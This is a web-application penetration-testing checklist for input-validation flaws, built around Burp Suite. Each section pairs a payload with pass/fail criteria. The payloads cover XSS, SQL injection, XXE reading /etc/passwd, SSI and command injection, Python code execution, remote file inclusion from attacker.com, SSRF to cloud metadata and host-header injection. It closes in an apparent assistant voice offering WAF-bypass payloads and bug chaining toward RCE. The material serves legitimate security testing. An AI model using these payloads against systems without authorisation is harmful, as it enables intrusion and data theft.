# Data-Input-Validation

---

# 🔁 1. Base Workflow (Repeat for ALL tests)

### Step 1: Capture request

* Burp Proxy ON → intercept request

### Step 2: Send to Repeater

* Right click → “Send to Repeater”

### Step 3: Modify ONE parameter

* Never test multiple at once

### Step 4: Send → Observe:

* Response body
* Status code
* UI (if stored)

---

# 🟠 2. Reflected XSS

### Tool:

* Burp Repeater + Browser

### Steps:

1. Find reflected input:

   * URL params, JSON fields
2. Inject:

```html
"><script>alert(1)</script>
```

3. Send request
4. Check response (Burp + browser)

### PASS:

* Output encoded (`&lt;script&gt;`)

### FAIL:

* Script executes immediately

---

# 🟡 3. Stored XSS

### Tool:

* Burp Repeater + Browser

### Steps:

1. Inject payload:

```html
<svg/onload=alert(1)>
```

2. Send request
3. Reload dashboard/page

### PASS:

* Rendered safely

### FAIL:

* Executes on page load (or other users)

---

# 🔵 4. DOM-Based XSS

### Tool:

* Browser DevTools

### Steps:

1. Open DevTools → Sources
2. Search:

   * `innerHTML`
   * `document.write`
3. Inject payload in request:

```html
"><img src=x onerror=alert(1)>
```

4. Observe execution in browser

### PASS:

* No execution

### FAIL:

* JS executes via client-side rendering

---

# 🟣 5. HTTP Parameter Pollution (HPP)

### Tool:

* Burp Repeater

### Steps:

1. Duplicate parameters:

```http
dashboardid=402&dashboardid=999
```

OR in JSON:

```json
"dashboardid":"402",
"dashboardid":"999"
```

2. Send request

### Observe:

* Which value is used?

### PASS:

* Proper validation / rejection

### FAIL:

* Filter bypass or logic confusion

---

# 🟢 6. SQL Injection

### Tool:

* Burp Repeater → sqlmap (optional)

### Steps:

1. Inject:

```sql
' OR 1=1--
```

2. Send request

3. Observe:

* Errors
* Data changes

### Confirm with:

```bash
sqlmap -r request.txt
```

### PASS:

* No effect

### FAIL:

* Data leak / auth bypass

---

# 🟤 7. LDAP Injection

### Tool:

* Burp Repeater

### Payload:

```text
*)(uid=*))(|(uid=*
```

### PASS:

* No abnormal behavior

### FAIL:

* Auth bypass / data leak

---

# ⚪ 8. XML Injection

### Tool:

* Burp Repeater

### Steps:

1. If XML exists:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

2. Send request

### PASS:

* Entity blocked

### FAIL:

* File content returned (XXE)

---

# ⚫ 9. SSI Injection

### Payload:

```html
<!--#exec cmd="whoami" -->
```

### Tool:

* Burp

### PASS:

* Output not executed

### FAIL:

* Server executes command

---

# 🔶 10. XPath Injection

### Payload:

```text
' or '1'='1
```

### PASS:

* Query unaffected

### FAIL:

* Auth bypass / data leak

---

# 🟠 11. IMAP / SMTP Injection

### Tool:

* Burp

### Payload:

```text
\r\nBCC: attacker@mail.com
```

### PASS:

* Ignored

### FAIL:

* Email manipulation

---

# 🔴 12. Code Injection

### Payload:

```python
__import__('os').system('id')
```

### PASS:

* Treated as string

### FAIL:

* Code execution

---

# 🟡 13. File Inclusion (LFI/RFI)

### Payloads:

```bash
../../../../etc/passwd
```

```bash
http://attacker.com/shell.txt
```

### Tool:

* Burp

### PASS:

* Blocked

### FAIL:

* File contents returned

---

# 🟢 14. Command Injection

### Payload:

```bash
; whoami
&& id
```

### PASS:

* No execution

### FAIL:

* Command output appears

---

# 🟣 15. Format String Injection

### Payload:

```text
%s%s%s%s
%x%x%x
```

### PASS:

* No change

### FAIL:

* Memory leakage / crash

---

# ⚫ 16. HTTP Splitting / Smuggling

### Tool:

* Burp Repeater

### Steps:

Add:

```http
Transfer-Encoding: chunked
Content-Length: 10
```

### PASS:

* Normal response

### FAIL:

* Desync / weird responses

---

# ⚪ 17. Host Header Injection

### Tool:

* Burp

### Modify:

```http
Host: attacker.com
```

or:

```http
X-Forwarded-Host: attacker.com
```

### PASS:

* Ignored

### FAIL:

* Reflected in links / redirects

---

# 🔵 18. SSTI

### Payload:

```jinja2
{{7*7}}
```

### PASS:

* Output is literal

### FAIL:

* Evaluated (returns 49)

---

# 🟤 19. SSRF

### Payload:

```bash
http://127.0.0.1
http://169.254.169.254
```

### PASS:

* Blocked

### FAIL:

* Internal access

---

# 🟠 20. Mass Assignment

### Tool:

* Burp

### Add:

```json
"is_admin": true
```

### PASS:

* Ignored

### FAIL:

* Privilege escalation

---

# 🔴 21. Overflow (Advanced)

### Tool:

* Burp Intruder

### Steps:

* Send very large input:

```text
AAAA....(10,000+ chars)
```

### PASS:

* Handled safely

### FAIL:

* Crash / error

---

# ⚫ 22. Incubated Vulnerabilities (Time-Based)

### Tool:

* Burp + patience

### Example:

* Inject payload
* Trigger later (admin panel, cron job)

---

# 🧠 Final Strategy (THIS is what makes it “clean”)

### Use this order:

1. XSS (fast, high impact)
2. Injection (SQL, SSTI, command)
3. Logic flaws (mass assignment, HPP)
4. Infra (SSRF, smuggling)

---

# 🧾 Pro Tip (Real Pentester Mindset)

Don’t just ask:

> “Did payload work?”

Ask:

> “Where does this input go in the system?”

* DB?
* Template?
* Shell?
* API?

👉 That tells you WHICH vulnerability to test.

---

# 🚀 If you want next level

I can:

* Map YOUR exact request → all injection points (line-by-line)
* Give you **payloads that bypass WAFs**
* Show **how to chain bugs into critical (RCE / account takeover)**

Just tell me 👍
